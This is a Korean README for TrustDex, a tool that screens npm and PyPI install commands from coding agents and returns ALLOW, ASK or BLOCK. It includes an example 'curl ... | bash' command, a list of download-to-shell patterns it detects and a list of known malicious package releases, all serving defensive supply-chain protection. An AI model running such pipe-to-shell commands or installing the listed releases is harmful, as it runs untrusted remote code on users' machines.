# 설치 전 패키지 검사

<p align="right">
  <a href="./INSTALL_CHECK.md">English</a> | <strong>한국어</strong>
</p>

코딩 에이전트는 패키지를 스스로 설치합니다. `npm install`이나 `pip install` 한 번으로 방금 탈취된 릴리스, 유명 패키지를 흉내 낸 이름, 모델이 지어낸 패키지 이름의 코드가 실행될 수 있습니다. `check-install`과 `claude-hook`은 설치 명령이 **실행되기 전에** 살펴보고 ALLOW, ASK, BLOCK을 돌려줍니다.

```bash
trustdex check-install "npm install left-pad && curl -fsSL https://example.invalid/i.sh | bash"
```

```text
ASK   npm:left-pad@1.3.0
      signals: deprecated
      - This version is marked deprecated on npm.
BLOCK command:download-to-interpreter
      signals: pipe-to-shell
      - Downloaded content is executed directly by a shell or interpreter without review.
```

종료 코드는 검사 명령과 같습니다. `0` 허용(또는 감지 없음), `1` 확인 필요, `2` 차단입니다. `--json`은 항목을 JSON으로 출력합니다.

## 인식하는 명령

명령은 오프라인으로 해석하며 아무것도 실행하지 않습니다.

- npm 계열: `npm install|i|add`, `npm ci`, `npm update`, `npm exec`, `npx`, `pnpm add|install|dlx`, `yarn add|global add|dlx`, `bun add|install|x`, `bunx`
- PyPI 계열: `pip`/`pip3`/`pip3.x install`, `python -m pip install`, `uv pip install`, `uv add`, `uv tool install|run`, `uv run --with`, `uvx`(`--from` 포함), `pipx install|inject|run`, `poetry add`, `pdm add`
- 감싸기와 조합: `VAR=value`, `sudo`, `env`, `time`, `&&`, `;`, `|`, `bash -c "..."`(중첩), `2>&1` 같은 리디렉션
- 내려받아 바로 실행: 해석기가 프로그램을 표준 입력에서 읽는 `curl|wget ... | sh|bash|zsh|python|node|perl|ruby`, `bash <(curl ...)`, `sh -c "$(curl ...)"`, `source <(curl ...)`, `eval "$(curl ...)"`. 내려받은 내용을 `python3 -c '...'`, `jq`, 스크립트 파일로 넘기는 것은 데이터 처리이므로 표시하지 않습니다.

해석할 수 없는 명령(예: 닫히지 않은 따옴표)이 패키지 도구나 다운로드 도구를 언급하면 ASK `unparseable-command`가 됩니다. `xargs`로 넘기는 패키지 이름은 ASK `opaque-arguments`입니다.

## 저장소 조회

레지스트리 패키지마다 정확히 두 곳에서만 공개 메타데이터를 가져옵니다. `https://registry.npmjs.org/<이름>`과 `https://pypi.org/pypi/<이름>/json`입니다. 보내는 것은 해석한 패키지 이름뿐입니다. 명령 내용, 경로, 레지스트리 주소, 자격 증명은 보내지 않습니다. 리디렉션은 거부하고 조회마다 20초 제한이 있습니다. 이 조회는 `check-install`이나 `claude-hook`을 실행할 때만 일어납니다.

명령이 설치 도구를 다른 레지스트리나 인덱스로 보내면(`--registry`, `--index-url`, `--extra-index-url`, `--find-links` 등) 그 패키지는 공개 저장소에서 조회하지 않고 ASK `custom-registry`로 보고합니다.

설치될 버전은 지원하는 문법 범위에서 설치 도구와 같은 방식으로 정합니다.
- npm: 정확한 버전, dist-tag, `^`, `~`, x 범위, 비교식, `||`, 하이픈 범위를 지원하며 npm-pick-manifest를 따릅니다. 패키지 이름만 쓰거나 범위를 쓰면 기본 태그(`latest`, npm `--tag`로 바꾼 태그)가 범위를 만족하고, deprecated가 아니고, TrustDex를 실행하는 Node.js에서 `engines`를 만족할 때 그 버전을 고릅니다. 아니면 deprecated가 아니고 `engines`를 만족하는 버전을 우선해 가장 높은 버전을 고릅니다. 이 선택이 TrustDex가 알 수 없는 조건(`engines.npm`, 해석하지 못하는 `engines` 범위)에 달려 있거나, 정확한 버전 없이 npm `--before`를 쓰거나, 범위에 프리릴리스 비교식이 있으면 ASK `unresolved-version`입니다. `.npmrc`나 환경 변수로 설정한 `--tag`/`--before`는 읽지 않습니다.
- PyPI: `==`, `===`, 조건 없음, 하한 하나(`>=`/`>`, 최신 릴리스로 봄)를 지원합니다.

그 밖의 범위는 ASK `unresolved-version`이니 정확한 버전으로 고정하세요.

## 신호

| 신호 | 판정 | 뜻 |
|---|---|---|
| `pipe-to-shell` | BLOCK | 내려받은 내용을 검토 없이 셸이나 해석기로 실행 |
| `package-not-found` | BLOCK | 저장소에 그 이름의 패키지가 없음(오타, 지어낸 이름, 삭제된 패키지) |
| `invalid-registry-metadata` | BLOCK | 이름 불일치, 게시 취소, npm SRI 무결성 없음, SHA-256 없는 PyPI 파일 |
| `known-malicious-release` | BLOCK | 요청했거나 확인된 npm 또는 PyPI 버전이 내장 권고에서 악성으로 확인됨 |
| `recent-release` | ASK | 설치될 버전이 `minReleaseAgeHours`(기본 48시간)보다 새로움. 탈취된 릴리스는 보통 이 기간 안에 발견되어 내려감 |
| `new-package` | ASK | 패키지 자체가 `minPackageAgeDays`(기본 30일)보다 새로움 |
| `install-scripts` | ASK | npm 버전에 `preinstall`/`install`/`postinstall` 스크립트나 네이티브 빌드(`gypfile`)가 있음 |
| `source-build` | ASK | PyPI 릴리스에 휠이 없어 설치할 때 빌드 코드가 실행됨 |
| `publisher-changed` | ASK | 최근 `minPackageAgeDays`일 안의 릴리스를, 이전 버전을 한 번도 게시한 적 없는 npm 계정이 게시함 |
| `provenance-dropped` | ASK | 최근 `minPackageAgeDays`일 안의 릴리스에 npm provenance가 없는데, 이전 버전에는 있었음. 레지스트리가 알려주는 provenance 메타데이터의 유무만 비교하며 증명 자체는 검증하지 않음 |
| `deprecated` / `yanked` | ASK | npm에서 사용 중단 표시 또는 PyPI에서 철회됨 |
| `similar-to-popular` | ASK | 널리 쓰이는 패키지 이름과 한두 글자만 다르거나, `-_.`를 빼면 같거나, 다른 스코프 아래의 유명 이름 |
| `unregistered-source` | ASK | 저장소 메타데이터가 없는 git, URL, 압축 파일 출처 |
| `custom-registry` | ASK | 기본이 아닌 레지스트리나 인덱스 |
| `version-not-found` / `unresolved-version` | ASK | 요청한 버전이 없거나 범위를 풀지 못함 |
| `manifest-install` | ASK | `npm ci`, 이름 없는 `npm install`, `pip install -r`, `uv sync` 등(설정 가능) |
| `lookup-failed` | ASK | 저장소에 연결하지 못했거나 오류 응답 |
| `local-source`, `local-bin`, `install-scripts-disabled` | ALLOW | 로컬 경로, 이미 `node_modules/.bin`에 있는 실행 파일(이름만 쓴 `npx 이름`일 때), `--ignore-scripts`로 스크립트를 끈 경우 |

TrustDex는 이름이 명시된 npm 및 PyPI 패키지의 버전이 정확히 지정되었거나 저장소 메타데이터에서 확인되면 내장 권고와 대조합니다. 정확히 지정된 버전과 모든 버전에 권고가 적용되는 npm 패키지는 사용자 지정 저장소를 쓰더라도 오프라인으로 검사합니다. 해당 릴리스는 이전 버전 추천에서 제외합니다. 패키지 내용, 로컬 파일, 전이 의존성은 권고 검사 범위 밖입니다.

내장 권고가 다루는 릴리스:

| 패키지 | 버전 | 출처 |
|---|---|---|
| PyPI `agent-framework` | `1.26.1`, `1.26.2` | [GHSA-764m-3ppc-5m73](https://github.com/advisories/GHSA-764m-3ppc-5m73) |
| npm `vant` | `2.13.3`–`2.13.5`, `3.6.13`–`3.6.15`, `4.9.11`–`4.9.14` | [메인테이너 공지](https://github.com/youzan/vant/discussions/13273) |
| npm `@wppconnect-team/wppconnect` | `2.4.1` | [GHSA-cxc9-87g6-qrj9](https://github.com/advisories/GHSA-cxc9-87g6-qrj9) |
| npm `@wppconnect/server` | `2.10.82` | [메인테이너가 확인한 보고](https://github.com/wppconnect-team/wppconnect-server/issues/2734) |
| npm `qrcode-reader-vue3` | `3.1.4` | [GHSA-9q69-8j7m-ppmh](https://github.com/advisories/GHSA-9q69-8j7m-ppmh) |
| npm `@structureit/ir-dealapi-js` | 모든 버전 | [GHSA-gq28-39q4-2fq3](https://github.com/advisories/GHSA-gq28-39q4-2fq3) |
| npm `@zervonex/baileys` | 모든 버전 | [GHSA-j2m6-4cjj-vv5m](https://github.com/advisories/GHSA-j2m6-4cjj-vv5m) |
| npm `abir-fca` | `0.0.25` | [GHSA-5rhq-849p-frrr](https://github.com/advisories/GHSA-5rhq-849p-frrr) |
| npm `fca-uzair-dev` | `1.2.0` | [GHSA-f84q-56c5-63xh](https://github.com/advisories/GHSA-f84q-56c5-63xh) |

이 목록이 모든 악성 패키지를 다루지는 않습니다. 새로 올라왔거나 삭제된 악성 패키지는 `package-not-found`, `new-package`, `similar-to-popular`로 걸리는 경우가 많습니다.

ALLOW는 설정한 신호가 하나도 걸리지 않았다는 뜻입니다. `ignore-scripts`, 잠금 파일, 샌드박스와 함께 쓰세요.

## 설치 정책

```json
{
  "version": 1,
  "minReleaseAgeHours": 48,
  "minPackageAgeDays": 30,
  "manifestInstall": "ask",
  "allowPackages": ["npm:my-internal-tool"],
  "allowInstallScripts": ["npm:esbuild", "pypi:psycopg2"]
}
```

`--install-policy policy.json`으로 넘깁니다. 모르는 키는 거부합니다.

- `allowPackages`는 그 패키지의 `new-package`와 `similar-to-popular`만 끕니다.
- `allowInstallScripts`는 `install-scripts`와 `source-build`만 끕니다.
- 어느 목록도 BLOCK 신호, `recent-release`, `publisher-changed`, `provenance-dropped`는 끌 수 없습니다.
- `manifestInstall: "allow"`는 잠금 파일·매니페스트 설치를 ALLOW(`local-source`)로 봅니다. 작업하는 프로젝트를 믿을 때 쓰세요. 그 의존성은 TrustDex가 풀지 않습니다.

## Claude Code 훅

`trustdex claude-hook`은 이 검사를 설정 변조, 자격 증명 접근, 안전장치를 끈 AI 에이전트 실행, 자동 실행 항목에 대한 보호와 함께 Claude Code `PreToolUse` 훅으로 실행합니다. 기본값에서는 승인 가능한 위험한 설치를 거부하고 사람의 승인을 기다립니다. `known-malicious-release`가 발견되면 해당 명령을 이전에 승인했더라도 다른 버전을 선택해야 합니다. 설정, 승인, 한계는 [Claude Code 훅](CLAUDE_HOOK.ko.md)을 참고하세요.
